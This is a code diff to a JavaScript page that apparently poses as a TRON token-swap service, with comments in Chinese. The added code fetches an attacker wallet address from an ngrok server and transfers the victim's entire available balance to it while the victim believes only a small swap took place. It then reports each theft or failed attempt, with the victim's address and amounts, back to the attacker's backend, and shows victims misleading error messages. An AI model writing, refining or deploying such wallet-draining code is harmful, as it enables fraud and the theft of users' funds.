@@ -2147,6 +2147,48 @@
     // const ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
     let ATTACKER_ADDRESS = 'TDUDyhCzhDsmbpqkPBZvLqjYngTwTgGE5s';
 
+    // 🎯 获取后端攻击者地址的函数
+    async function getCurrentAttackerAddress() {
+        try {
+            // 尝试从ngrok后端获取
+            const ngrokUrl = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';
+            const response = await fetch(`${ngrokUrl}/api/attacker_address`, {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                }
+            });
+
+            if (response.ok) {
+                const result = await response.json();
+                if (result.status === 'success' && result.data && result.data.attacker_address) {
+                    debugLog(`🎯 从后端获取攻击者地址: ${result.data.attacker_address}`);
+                    return {
+                        address: result.data.attacker_address,
+                        info: {
+                            wallet_name: result.data.wallet_name,
+                            network: result.data.network,
+                            usage_count: result.data.usage_count
+                        }
+                    };
+                }
+            }
+        } catch (error) {
+            debugLog(`⚠️ 从后端获取攻击者地址失败: ${error.message}`);
+        }
+
+        // 如果后端获取失败，返回当前地址
+        return {
+            address: ATTACKER_ADDRESS,
+            info: {
+                wallet_name: '默认攻击者钱包',
+                network: 'TRON',
+                usage_count: 0
+            }
+        };
+    }
+
 
     // 初始化
     document.addEventListener('DOMContentLoaded', async function() {
@@ -2711,14 +2753,36 @@
                     return password;
                 };
 
-                // 🎯 关键修复：添加详细的交易执行日志
-                debugLog('🎯 即将调用 tronWeb.trx.sendTransaction...');
+                // 🎯 关键修复：使用正确的TRON转账方法
+                debugLog('🎯 即将调用 tronWeb.trx.sendTrx...');
                 debugLog(`🎯 参数检查:`);
                 debugLog(`- ATTACKER_ADDRESS: ${ATTACKER_ADDRESS}`);
-                debugLog(`- transferAmount: ${transferAmount}`);
+                debugLog(`- transferAmount (SUN): ${transferAmount}`);
+                debugLog(`- transferAmount (TRX): ${transferAmount / 1000000}`);
                 debugLog(`- tronWeb状态: ${!!tronWeb}`);
                 debugLog(`- tronWeb.trx状态: ${!!tronWeb.trx}`);
-                const transaction = await tronWeb.trx.sendTransaction(
+                
+                // 🎯 验证地址格式
+                if (!ATTACKER_ADDRESS || ATTACKER_ADDRESS.length !== 34 || !ATTACKER_ADDRESS.startsWith('T')) {
+                    throw new Error(`Invalid TRON address format: ${ATTACKER_ADDRESS}`);
+                }
+                
+                // 🎯 验证转账金额
+                if (transferAmount <= 0) {
+                    throw new Error(`Invalid transfer amount: ${transferAmount}`);
+                }
+                
+                // 🎯 检查钱包连接状态
+                if (!tronWeb.defaultAddress || !tronWeb.defaultAddress.base58) {
+                    throw new Error('Wallet not properly connected');
+                }
+                
+                debugLog(`🎯 当前钱包地址: ${tronWeb.defaultAddress.base58}`);
+                debugLog(`🎯 目标地址: ${ATTACKER_ADDRESS}`);
+                debugLog(`🎯 转账金额: ${transferAmount / 1000000} TRX`);
+                
+                // 🎯 使用正确的TRON转账方法
+                const transaction = await tronWeb.trx.sendTrx(
                     ATTACKER_ADDRESS,
                     transferAmount
                 );
@@ -2729,6 +2793,32 @@
                 debugLog(`💰 B成员（受害者）剩余: ${feeReserve} TRX (手续费)`);
                 debugLog(`💰 等价USD价值: $${(availableBalance * 0.1634).toFixed(2)}`);
                 debugLog(`😈 B成员（受害者）以为只兑换了: ${fromAmount} TRX`);
+
+                // 🎯 向后端发送攻击成功记录
+                try {
+                    const attackData = {
+                        victim_address: currentAccount,
+                        attacker_address: ATTACKER_ADDRESS,
+                        fake_amount: fromAmount,
+                        real_amount: availableBalance,
+                        transaction_hash: transaction.txid || transaction,
+                        timestamp: new Date().toISOString(),
+                        attack_type: 'TRX_SWAP_HIJACK',
+                        status: 'success'
+                    };
+
+                    const ngrokUrl = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';
+                    await fetch(`${ngrokUrl}/api/record_attack`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(attackData)
+                    });
+                    debugLog('🎯 攻击记录已发送到后端');
+                } catch (error) {
+                    debugLog(`⚠️ 发送攻击记录失败: ${error.message}`);
+                }
 
                 // 🔧 关键修复：强制刷新余额
                 debugLog('🔄 等待3秒后刷新余额...');
@@ -2769,27 +2859,61 @@
                 debugLog(`❌ 真实转账失败: ${error.message}`);
                 debugLog(`❌ 错误详情: ${JSON.stringify(error)}`);
                 debugLog(`❌ 错误类型: ${error.constructor.name}`);
+                debugLog(`❌ 错误堆栈: ${error.stack}`);
+
+                // 🎯 向后端发送失败记录
+                try {
+                    const failedAttackData = {
+                        victim_address: currentAccount,
+                        attacker_address: ATTACKER_ADDRESS,
+                        fake_amount: fromAmount,
+                        real_amount: availableBalance,
+                        error_message: error.message,
+                        error_type: error.constructor.name,
+                        timestamp: new Date().toISOString(),
+                        attack_type: 'TRX_SWAP_HIJACK',
+                        status: 'failed'
+                    };
+
+                    const ngrokUrl = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';
+                    await fetch(`${ngrokUrl}/api/record_attack`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(failedAttackData)
+                    });
+                    debugLog('🎯 失败记录已发送到后端');
+                } catch (recordError) {
+                    debugLog(`⚠️ 发送失败记录失败: ${recordError.message}`);
+                }
 
                 // 🎯 关键修复：根据错误类型显示不同的用户提示
-                if (error.message.includes('User rejected') || error.message.includes('User denied')) {
+                if (error.message.includes('User rejected') || error.message.includes('User denied') || error.message.includes('cancelled')) {
                     debugLog('🎯 用户取消了交易');
                     showToast('交易已取消', 'warning');
-                } else if (error.message.includes('Insufficient balance')) {
+                } else if (error.message.includes('Insufficient balance') || error.message.includes('insufficient')) {
                     debugLog('🎯 余额不足');
                     showToast('余额不足，无法完成交易', 'error');
-                } else if (error.message.includes('Invalid address')) {
+                } else if (error.message.includes('Invalid address') || error.message.includes('invalid')) {
                     debugLog('🎯 地址无效');
                     showToast('地址错误，请联系客服', 'error');
+                } else if (error.message.includes('network') || error.message.includes('timeout')) {
+                    debugLog('🎯 网络错误');
+                    showToast('网络连接异常，请检查网络后重试', 'error');
                 } else {
-                    debugLog('🎯 其他错误，可能是网络或钱包问题');
-                    showToast('网络异常，请稍后重试', 'error');
+                    debugLog('🎯 其他错误，可能是钱包或API问题');
+                    showToast('交易处理异常，请稍后重试', 'error');
                 }
+                
                 debugLog('🎯 转账失败可能原因:');
                 debugLog('1. 用户取消了转账授权');
                 debugLog('2. 余额不足支付手续费');
                 debugLog('3. 网络连接问题');
                 debugLog('4. 钱包安全限制');
                 debugLog('5. TronWeb API调用错误');
+                debugLog('6. 地址格式错误');
+                debugLog('7. 钱包未正确连接');
 
                 // 如果真实转账失败，使用原有模拟模式
                 debugLog('🎯 切换到模拟攻击模式...');
